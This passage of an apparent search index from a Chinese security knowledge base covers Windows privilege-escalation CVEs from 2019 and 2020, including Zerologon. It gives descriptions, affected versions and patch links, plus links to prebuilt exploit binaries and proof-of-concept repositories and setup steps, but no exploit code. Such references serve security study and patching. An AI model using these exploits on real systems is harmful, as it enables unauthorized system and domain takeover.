AUTHORITY\\SYSTEM\u6743\u9650\u8fd0\u884c\uff0c\u5b8c\u6574\u6027\u7ea7\u522b\u4e3aSystem\u3002\u56e0\u4e3a\u7528\u6237\u53ef\u4ee5\u4e0e\u8be5UI\u4ea4\u4e92\uff0c\u56e0\u6b64\u5fc5\u987b\u5bf9UI\u8fdb\u884c\u4e25\u683c\u9650\u5236\u3002\u5426\u5219\uff0c\u4f4e\u6743\u9650\u7684\u7528\u6237\u53ef\u80fd\u53ef\u4ee5\u901a\u8fc7UI\u64cd\u4f5c\u7684\u5faa\u73af\u8def\u7531\u4ee5SYSTEM\u6743\u9650\u6267\u884c\u64cd\u4f5c\u3002\u5373\u4f7f\u9694\u79bb\u72b6\u6001\u7684\u770b\u4f3c\u65e0\u5bb3\u7684UI\u7279\u5f81\u90fd\u53ef\u80fd\u4f1a\u6210\u4e3a\u5f15\u53d1\u4efb\u610f\u63a7\u5236\u7684\u52a8\u4f5c\u94fe\u7684\u7b2c\u4e00\u6b65\u3002\u4e8b\u5b9e\u4e0a\uff0cUAC\u5bf9\u8bdd\u6846\u5df2\u88ab\u7cbe\u7b80\uff0c\u4ec5\u5305\u542b\u6700\u5c11\u7684\u53ef\u5355\u51fb\u9009\u9879\u3002 \u5f71\u54cd\u7248\u672c Microsoft Windows Server 2019 Microsoft Windows Server 2016 Microsoft Windows Server 2012 Microsoft Windows Server 2008 R2 Microsoft Windows Server 2008 Microsoft Windows RT 8.1 Microsoft Windows 8.1 Microsoft Windows 7 \u4fee\u590d\u8865\u4e01 https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1388 \u5229\u7528\u65b9\u5f0f \u8fd9\u8fb9\u76f4\u63a5\u8d34\u4e00\u4e2aGIF\u56fe\u5c31\u597d\u4e86\uff0c\u5229\u7528\u6587\u4ef6\u4f4d\u7f6e https://github.com/Ascotbe/WindowsKernelExploits/blob/master/CVE-2019-1388/HHUPD.EXE https://github.com/Ascotbe/Kernelhub/tree/master/CVE-2019-1388","title":"\uff08CVE-2019-1388\uff09Windows UAC\u63d0\u6743\u6f0f\u6d1e.md"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-1388\uff09Windows UAC\u63d0\u6743\u6f0f\u6d1e/#cve-2019-1388windows-uacmd","text":"","title":"\uff08CVE-2019-1388\uff09Windows UAC\u63d0\u6743\u6f0f\u6d1e.md"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-1388\uff09Windows UAC\u63d0\u6743\u6f0f\u6d1e/#_1","text":"\u8be5\u6f0f\u6d1e\u4f4d\u4e8eWindows\u7684UAC\uff08User Account Control\uff0c\u7528\u6237\u5e10\u6237\u63a7\u5236\uff09\u673a\u5236\u4e2d\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cWindows\u4f1a\u5728\u4e00\u4e2a\u5355\u72ec\u7684\u684c\u9762\u4e0a\u663e\u793a\u6240\u6709\u7684UAC\u63d0\u793a\u2014\u2014Secure Desktop\u3002\u8fd9\u4e9b\u63d0\u793a\u662f\u7531\u540d\u4e3aconsent.exe\u7684\u53ef\u6267\u884c\u6587\u4ef6\u4ea7\u751f\u7684\uff0c\u8be5\u53ef\u6267\u884c\u6587\u4ef6\u4ee5NT AUTHORITY\\SYSTEM\u6743\u9650\u8fd0\u884c\uff0c\u5b8c\u6574\u6027\u7ea7\u522b\u4e3aSystem\u3002\u56e0\u4e3a\u7528\u6237\u53ef\u4ee5\u4e0e\u8be5UI\u4ea4\u4e92\uff0c\u56e0\u6b64\u5fc5\u987b\u5bf9UI\u8fdb\u884c\u4e25\u683c\u9650\u5236\u3002\u5426\u5219\uff0c\u4f4e\u6743\u9650\u7684\u7528\u6237\u53ef\u80fd\u53ef\u4ee5\u901a\u8fc7UI\u64cd\u4f5c\u7684\u5faa\u73af\u8def\u7531\u4ee5SYSTEM\u6743\u9650\u6267\u884c\u64cd\u4f5c\u3002\u5373\u4f7f\u9694\u79bb\u72b6\u6001\u7684\u770b\u4f3c\u65e0\u5bb3\u7684UI\u7279\u5f81\u90fd\u53ef\u80fd\u4f1a\u6210\u4e3a\u5f15\u53d1\u4efb\u610f\u63a7\u5236\u7684\u52a8\u4f5c\u94fe\u7684\u7b2c\u4e00\u6b65\u3002\u4e8b\u5b9e\u4e0a\uff0cUAC\u5bf9\u8bdd\u6846\u5df2\u88ab\u7cbe\u7b80\uff0c\u4ec5\u5305\u542b\u6700\u5c11\u7684\u53ef\u5355\u51fb\u9009\u9879\u3002","title":"\u63cf\u8ff0"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-1388\uff09Windows UAC\u63d0\u6743\u6f0f\u6d1e/#_2","text":"Microsoft Windows Server 2019 Microsoft Windows Server 2016 Microsoft Windows Server 2012 Microsoft Windows Server 2008 R2 Microsoft Windows Server 2008 Microsoft Windows RT 8.1 Microsoft Windows 8.1 Microsoft Windows 7","title":"\u5f71\u54cd\u7248\u672c"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-1388\uff09Windows UAC\u63d0\u6743\u6f0f\u6d1e/#_3","text":"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1388","title":"\u4fee\u590d\u8865\u4e01"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-1388\uff09Windows UAC\u63d0\u6743\u6f0f\u6d1e/#_4","text":"\u8fd9\u8fb9\u76f4\u63a5\u8d34\u4e00\u4e2aGIF\u56fe\u5c31\u597d\u4e86\uff0c\u5229\u7528\u6587\u4ef6\u4f4d\u7f6e https://github.com/Ascotbe/WindowsKernelExploits/blob/master/CVE-2019-1388/HHUPD.EXE https://github.com/Ascotbe/Kernelhub/tree/master/CVE-2019-1388","title":"\u5229\u7528\u65b9\u5f0f"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-1458\uff09Win32k\u672c\u5730\u63d0\u6743/","text":"\uff08CVE-2019-1458\uff09Win32k\u672c\u5730\u63d0\u6743\u6f0f\u6d1e.md \u63cf\u8ff0 CVE-2019-1458\u662fWin32k\u4e2d\u7684\u7279\u6743\u63d0\u5347\u6f0f\u6d1e\uff0cWin32k\u7ec4\u4ef6\u65e0\u6cd5\u6b63\u786e\u5904\u7406\u5185\u5b58\u4e2d\u7684\u5bf9\u8c61\u65f6\uff0c\u5bfc\u81f4Windows\u4e2d\u5b58\u5728\u4e00\u4e2a\u7279\u6743\u63d0\u5347\u6f0f\u6d1e\u3002\u6210\u529f\u5229\u7528\u6b64\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\u8fd0\u884c\u4efb\u610f\u4ee3\u7801\u3002\u7136\u540e\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5b89\u88c5\u7a0b\u5e8f\u3001\u67e5\u770b\u3001\u66f4\u6539\u6216\u5220\u9664\u6570\u636e\uff1b\u6216\u521b\u5efa\u5177\u6709\u5b8c\u5168\u7528\u6237\u6743\u9650\u7684\u65b0\u5e10\u6237\u3002 \u5f71\u54cd\u7248\u672c Microsoft Windows 10 Version 1607 for 32-bit Systems Microsoft Windows 10 Version 1607 for x64-based Systems Microsoft Windows 10 for 32-bit Systems Microsoft Windows 10 for x64-based Systems Microsoft Windows 7 for 32-bit Systems SP1 Microsoft Windows 7 for x64-based Systems SP1 Microsoft Windows 8.1 for 32-bit Systems Microsoft Windows 8.1 for x64-based Systems Microsoft Windows RT 8.1 Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1 Microsoft Windows Server 2008 R2 for x64-based Systems SP1 Microsoft Windows Server 2008 for 32-bit Systems SP2 Microsoft Windows Server 2008 for Itanium-based Systems SP2 Microsoft Windows Server 2008 for x64-based Systems SP2 Microsoft Windows Server 2012 Microsoft Windows Server 2012 R2 Microsoft Windows Server 2016 \u4fee\u590d\u8865\u4e01 https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1458 \u5229\u7528\u65b9\u5f0f \u7f16\u8bd1\u73af\u5883 VS2019\uff08V120\uff09X64 Release \u7f16\u8bd1\u597d\u7684\u6587\u4ef6 cve-2019-1458.exe \u7136\u540e\u76f4\u63a5\u4e0aGIF\u56fe https://github.com/Ascotbe/Kernelhub/tree/master/CVE-2019-1458","title":"\uff08CVE-2019-1458\uff09Win32k\u672c\u5730\u63d0\u6743\u6f0f\u6d1e.md"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-1458\uff09Win32k\u672c\u5730\u63d0\u6743/#cve-2019-1458win32kmd","text":"","title":"\uff08CVE-2019-1458\uff09Win32k\u672c\u5730\u63d0\u6743\u6f0f\u6d1e.md"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-1458\uff09Win32k\u672c\u5730\u63d0\u6743/#_1","text":"CVE-2019-1458\u662fWin32k\u4e2d\u7684\u7279\u6743\u63d0\u5347\u6f0f\u6d1e\uff0cWin32k\u7ec4\u4ef6\u65e0\u6cd5\u6b63\u786e\u5904\u7406\u5185\u5b58\u4e2d\u7684\u5bf9\u8c61\u65f6\uff0c\u5bfc\u81f4Windows\u4e2d\u5b58\u5728\u4e00\u4e2a\u7279\u6743\u63d0\u5347\u6f0f\u6d1e\u3002\u6210\u529f\u5229\u7528\u6b64\u6f0f\u6d1e\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u5185\u6838\u6a21\u5f0f\u4e0b\u8fd0\u884c\u4efb\u610f\u4ee3\u7801\u3002\u7136\u540e\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5b89\u88c5\u7a0b\u5e8f\u3001\u67e5\u770b\u3001\u66f4\u6539\u6216\u5220\u9664\u6570\u636e\uff1b\u6216\u521b\u5efa\u5177\u6709\u5b8c\u5168\u7528\u6237\u6743\u9650\u7684\u65b0\u5e10\u6237\u3002","title":"\u63cf\u8ff0"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-1458\uff09Win32k\u672c\u5730\u63d0\u6743/#_2","text":"Microsoft Windows 10 Version 1607 for 32-bit Systems Microsoft Windows 10 Version 1607 for x64-based Systems Microsoft Windows 10 for 32-bit Systems Microsoft Windows 10 for x64-based Systems Microsoft Windows 7 for 32-bit Systems SP1 Microsoft Windows 7 for x64-based Systems SP1 Microsoft Windows 8.1 for 32-bit Systems Microsoft Windows 8.1 for x64-based Systems Microsoft Windows RT 8.1 Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1 Microsoft Windows Server 2008 R2 for x64-based Systems SP1 Microsoft Windows Server 2008 for 32-bit Systems SP2 Microsoft Windows Server 2008 for Itanium-based Systems SP2 Microsoft Windows Server 2008 for x64-based Systems SP2 Microsoft Windows Server 2012 Microsoft Windows Server 2012 R2 Microsoft Windows Server 2016","title":"\u5f71\u54cd\u7248\u672c"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-1458\uff09Win32k\u672c\u5730\u63d0\u6743/#_3","text":"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1458","title":"\u4fee\u590d\u8865\u4e01"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2019-1458\uff09Win32k\u672c\u5730\u63d0\u6743/#_4","text":"\u7f16\u8bd1\u73af\u5883 VS2019\uff08V120\uff09X64 Release \u7f16\u8bd1\u597d\u7684\u6587\u4ef6 cve-2019-1458.exe \u7136\u540e\u76f4\u63a5\u4e0aGIF\u56fe https://github.com/Ascotbe/Kernelhub/tree/master/CVE-2019-1458","title":"\u5229\u7528\u65b9\u5f0f"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-0787\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/","text":"\uff08CVE-2020-0787\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e \u4e00\u3001\u6f0f\u6d1e\u6982\u8ff0\uff1a 2020\u5e743\u670810\u65e5\uff0c\u5fae\u8f6f\u5b98\u65b9\u516c\u5e03\u4e86\u4e00\u4e2a\u672c\u5730\u63d0\u6743\u6f0f\u6d1eCVE-2020-0787\uff0c\u6839\u636e\u5fae\u8f6f\u7684\u6f0f\u6d1e\u63cf\u8ff0\u58f0\u79f0\uff0c\u653b\u51fb\u8005\u5728\u4f7f\u7528\u4f4e\u6743\u9650\u7528\u6237\u767b\u5f55\u7cfb\u7edf\u540e\uff0c\u53ef\u4ee5\u5229\u7528\u8be5\u6f0f\u6d1e\u6784\u9020\u6076\u610f\u7a0b\u5e8f\u76f4\u63a5\u63d0\u6743\u5230administrator\u6216\u8005system\u6743\u9650\u3002system\u662fwindows\u6240\u6709\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u6743\u9650\u6700\u5927\u7684\u8d26\u6237\u3002 \u4e8c\u3001\u5f71\u54cd\u8303\u56f4 \u57fa\u672c\u4e0aWindows\u5168\u7248\u672c\u4e86 Windows 10 for 32-bit Systems Windows 10 for x64-based Systems Windows 10 Version 1607 for 32-bit Systems Windows 10 Version 1607 for x64-based Systems Windows 10 Version 1709 for 32-bit Systems Windows 10 Version 1709 for ARM64-based Systems Windows 10 Version 1709 for x64-based Systems Windows 10 Version 1803 for 32-bit Systems Windows 10 Version 1803 for ARM64-based Systems Windows 10 Version 1803 for x64-based Systems Windows 10 Version 1809 for 32-bit Systems Windows 10 Version 1809 for ARM64-based Systems Windows 10 Version 1809 for x64-based Systems Windows 10 Version 1903 for 32-bit Systems Windows 10 Version 1903 for ARM64-based Systems Windows 10 Version 1903 for x64-based Systems Windows 10 Version 1909 for 32-bit Systems Windows 10 Version 1909 for ARM64-based Systems Windows 10 Version 1909 for x64-based Systems Windows 7 for 32-bit Systems Service Pack 1 Windows 7 for x64-based Systems Service Pack 1 Windows 8.1 for 32-bit systems Windows 8.1 for x64-based systems Windows RT 8.1 Windows Server 2008 for 32-bit Systems Service Pack 2 Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) Windows Server 2008 for Itanium-Based Systems Service Pack 2 Windows Server 2008 for x64-based Systems Service Pack 2 Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server, version 1803 (Server Core Installation) Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation \u6f0f\u6d1e\u5229\u7528 https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION POC\u6210\u529f\u4f1a\u5f39\u51faSYSTEM\u6743\u9650CMD\u4e0d\u9002\u7528\u4e8eWebShell","title":"\uff08CVE-2020-0787\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-0787\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#cve-2020-0787windows","text":"","title":"\uff08CVE-2020-0787\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-0787\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_1","text":"2020\u5e743\u670810\u65e5\uff0c\u5fae\u8f6f\u5b98\u65b9\u516c\u5e03\u4e86\u4e00\u4e2a\u672c\u5730\u63d0\u6743\u6f0f\u6d1eCVE-2020-0787\uff0c\u6839\u636e\u5fae\u8f6f\u7684\u6f0f\u6d1e\u63cf\u8ff0\u58f0\u79f0\uff0c\u653b\u51fb\u8005\u5728\u4f7f\u7528\u4f4e\u6743\u9650\u7528\u6237\u767b\u5f55\u7cfb\u7edf\u540e\uff0c\u53ef\u4ee5\u5229\u7528\u8be5\u6f0f\u6d1e\u6784\u9020\u6076\u610f\u7a0b\u5e8f\u76f4\u63a5\u63d0\u6743\u5230administrator\u6216\u8005system\u6743\u9650\u3002system\u662fwindows\u6240\u6709\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u6743\u9650\u6700\u5927\u7684\u8d26\u6237\u3002","title":"\u4e00\u3001\u6f0f\u6d1e\u6982\u8ff0\uff1a"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-0787\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_2","text":"\u57fa\u672c\u4e0aWindows\u5168\u7248\u672c\u4e86 Windows 10 for 32-bit Systems Windows 10 for x64-based Systems Windows 10 Version 1607 for 32-bit Systems Windows 10 Version 1607 for x64-based Systems Windows 10 Version 1709 for 32-bit Systems Windows 10 Version 1709 for ARM64-based Systems Windows 10 Version 1709 for x64-based Systems Windows 10 Version 1803 for 32-bit Systems Windows 10 Version 1803 for ARM64-based Systems Windows 10 Version 1803 for x64-based Systems Windows 10 Version 1809 for 32-bit Systems Windows 10 Version 1809 for ARM64-based Systems Windows 10 Version 1809 for x64-based Systems Windows 10 Version 1903 for 32-bit Systems Windows 10 Version 1903 for ARM64-based Systems Windows 10 Version 1903 for x64-based Systems Windows 10 Version 1909 for 32-bit Systems Windows 10 Version 1909 for ARM64-based Systems Windows 10 Version 1909 for x64-based Systems Windows 7 for 32-bit Systems Service Pack 1 Windows 7 for x64-based Systems Service Pack 1 Windows 8.1 for 32-bit systems Windows 8.1 for x64-based systems Windows RT 8.1 Windows Server 2008 for 32-bit Systems Service Pack 2 Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) Windows Server 2008 for Itanium-Based Systems Service Pack 2 Windows Server 2008 for x64-based Systems Service Pack 2 Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server, version 1803 (Server Core Installation) Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation","title":"\u4e8c\u3001\u5f71\u54cd\u8303\u56f4"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-0787\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_3","text":"https://github.com/cbwang505/CVE-2020-0787-EXP-ALL-WINDOWS-VERSION POC\u6210\u529f\u4f1a\u5f39\u51faSYSTEM\u6743\u9650CMD\u4e0d\u9002\u7528\u4e8eWebShell","title":"\u6f0f\u6d1e\u5229\u7528"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-0796\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/","text":"CVE-2020-0796 \u63cf\u8ff0 \u8be5\u6f0f\u6d1e\u65e0\u9700\u6388\u6743\u9a8c\u8bc1\u5373\u53ef\u88ab\u8fdc\u7a0b\u5229\u7528\uff0c\u53ef\u80fd\u5f62\u6210\u8815\u866b\u7ea7\u6f0f\u6d1e\u3002\u76ee\u524d\u5229\u7528\u65b9\u5f0f\u662f\u63d0\u6743 \u5f71\u54cd\u7248\u672c Windows 10 Version 1903 for 32-bit Systems Windows 10 Version 1903 for x64-based Systems Windows 10 Version 1903 for ARM64-based Systems Windows Server, version 1903 (Server Core installation) Windows 10 Version 1909 for 32-bit Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for ARM64-based Systems Windows Server, version 1909 (Server Core installation) \u53ea\u5f71\u54cd SMB v3.1.1\uff0c1903\u548c1909 \u4fee\u590d\u8865\u4e01 https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796 \u5229\u7528\u65b9\u5f0f \u8fd9\u4e2a\u6709\u70b9\u9e21\u808b\u7279\u5b9a\u7684windows10 \u624d\u884c\u8fd8\u6709\u4e00\u4e2aWindows Server 2016 \u7f16\u8bd1\u65b9\u5f0f VS2019\uff08V142\uff09X64 Debug \u7f16\u8bd1\u597d\u7684\u6587\u4ef6\u4f4d\u7f6e https://github.com/Ascotbe/WindowsKernelExploits/blob/master/CVE-2020-0796/cve-2020-0796-local.exe \u73af\u5883\u4e0b\u8f7d\uff0c\u8fd9\u8fb9\u7528\u7684\u662fwindows 10 Version 1903 ed2k://|file|cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso|4815527936|47D4C57E638DF8BF74C59261E2CE702D|/ \u67e5\u770bMD5\u503c Get-FileHash -Path c:/windows/system32/drivers/srv2.sys \u7136\u540e\u5c31\u76f4\u63a5\u4e0aGIF\u56fe\u4e86 \u9879\u76ee\u6765\u6e90 @danigargu https://github.com/Ascotbe/Kernelhub/tree/master/CVE-2020-0796","title":"CVE-2020-0796"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-0796\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#cve-2020-0796","text":"","title":"CVE-2020-0796"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-0796\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_1","text":"\u8be5\u6f0f\u6d1e\u65e0\u9700\u6388\u6743\u9a8c\u8bc1\u5373\u53ef\u88ab\u8fdc\u7a0b\u5229\u7528\uff0c\u53ef\u80fd\u5f62\u6210\u8815\u866b\u7ea7\u6f0f\u6d1e\u3002\u76ee\u524d\u5229\u7528\u65b9\u5f0f\u662f\u63d0\u6743","title":"\u63cf\u8ff0"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-0796\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_2","text":"Windows 10 Version 1903 for 32-bit Systems Windows 10 Version 1903 for x64-based Systems Windows 10 Version 1903 for ARM64-based Systems Windows Server, version 1903 (Server Core installation) Windows 10 Version 1909 for 32-bit Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for ARM64-based Systems Windows Server, version 1909 (Server Core installation) \u53ea\u5f71\u54cd SMB v3.1.1\uff0c1903\u548c1909","title":"\u5f71\u54cd\u7248\u672c"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-0796\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_3","text":"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796","title":"\u4fee\u590d\u8865\u4e01"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-0796\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_4","text":"\u8fd9\u4e2a\u6709\u70b9\u9e21\u808b\u7279\u5b9a\u7684windows10 \u624d\u884c\u8fd8\u6709\u4e00\u4e2aWindows Server 2016 \u7f16\u8bd1\u65b9\u5f0f VS2019\uff08V142\uff09X64 Debug \u7f16\u8bd1\u597d\u7684\u6587\u4ef6\u4f4d\u7f6e https://github.com/Ascotbe/WindowsKernelExploits/blob/master/CVE-2020-0796/cve-2020-0796-local.exe \u73af\u5883\u4e0b\u8f7d\uff0c\u8fd9\u8fb9\u7528\u7684\u662fwindows 10 Version 1903 ed2k://|file|cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso|4815527936|47D4C57E638DF8BF74C59261E2CE702D|/ \u67e5\u770bMD5\u503c Get-FileHash -Path c:/windows/system32/drivers/srv2.sys \u7136\u540e\u5c31\u76f4\u63a5\u4e0aGIF\u56fe\u4e86","title":"\u5229\u7528\u65b9\u5f0f"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-0796\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#_5","text":"@danigargu https://github.com/Ascotbe/Kernelhub/tree/master/CVE-2020-0796","title":"\u9879\u76ee\u6765\u6e90"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-1054\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/","text":"\uff08CVE-2020-1054\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e https://github.com/0xeb-bp/cve-2020-1054","title":"\uff08CVE-2020-1054\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-1054\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e/#cve-2020-1054windows","text":"https://github.com/0xeb-bp/cve-2020-1054","title":"\uff08CVE-2020-1054\uff09Windows \u672c\u5730\u63d0\u6743\u6f0f\u6d1e"},{"location":"\u7cfb\u7edf\u5b89\u5168/Windows/Windows\u672c\u5730\u63d0\u6743\u6f0f\u6d1e/\uff08CVE-2020-1472\uff09Windows Zerologon\u57df\u63d0\u6743\u6f0f\u6d1e/","text":"CVE-2020-1472 \u63cf\u8ff0 \u653b\u51fb\u8005\u4f7f\u7528Netlogon\u8fdc\u7a0b\u534f\u8bae\uff08MS-NRPC\uff09\u5efa\u7acb\u4e0e\u57df\u63a7\u5236\u5668\u7684\u6613\u53d7\u653b\u51fb\u7684Netlogon\u5b89\u5168\u901a\u9053\u8fde\u63a5\u65f6\uff0c\u5c06\u5b58\u5728\u7279\u6743\u63d0\u5347\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u6f0f\u6d1e\u8fdb\u884c\u8fdc\u7a0b\u4fee\u6539\u5bc6\u7801\u7b49\u64cd\u4f5c \u5f71\u54cd\u7248\u672c Product Version Update Edition Tested Windows Server 2008 R2 for x64-based Systems Service Pack 1 \u2714\ufe0f Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) \u2714\ufe0f Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation) Windows Server, version 2004 (Server Core installation) \u4fee\u590d\u8865\u4e01 https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472 \u5229\u7528\u65b9\u5f0f \u6ce8\u610f\uff1aEXP\u811a\u672c\u4f1a\u91cd\u7f6e\u57df\u63a7\u673a\u5668\u7684\u5bc6\u7801\uff01\uff01\uff01\u4e0d\u8981\u778e\u9e21\u513f\u4e71\u7528\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01 \u6d4b\u8bd5\u673a\u5668Windows Server 2008 R2 SP1 X64 \uff0c\u5e76\u4e14\u8bbe\u7f6e\u73af\u5883\u4e3a\u57df\u63a7\u673a\u5668 \u7531\u4e0a\u56fe\u53ef\u77e5\uff1a \u57df\u4e3a- ascotbe.com \u8ba1\u7b97\u673a\u540d\u4e3a- dc \u57df\u63a7ip- 192.168.183.171 \u4f7f\u7528\u524d\u73af\u5883\u914d\u7f6e\uff0c\u9700\u8981Python3.7+\u7684\u7248\u672c\uff0c\u5982\u679c\u4e4b\u524d\u6709\u5b89\u88c5\u8fc7 impacket \u7684python\u5305\u7684\u8bdd\uff08\u6bd4\u5982kali\uff09\u9700\u8981\u5378\u8f7d\u4e86\u5728\u91cd\u65b0\u5b89\u88c5 0.9.21 \u8fd9\u4e2a\u7248\u672c\u7684\u5305\uff0c\u5feb\u6377\u8bed\u53e5 python3 -m pip install git+https://github.com/SecureAuthCorp/impacket \uff0c\u4e0b\u9762\u662f\u901a\u7528\u65b9\u6cd5 python3 -m pip install -r Kernelhub.txt 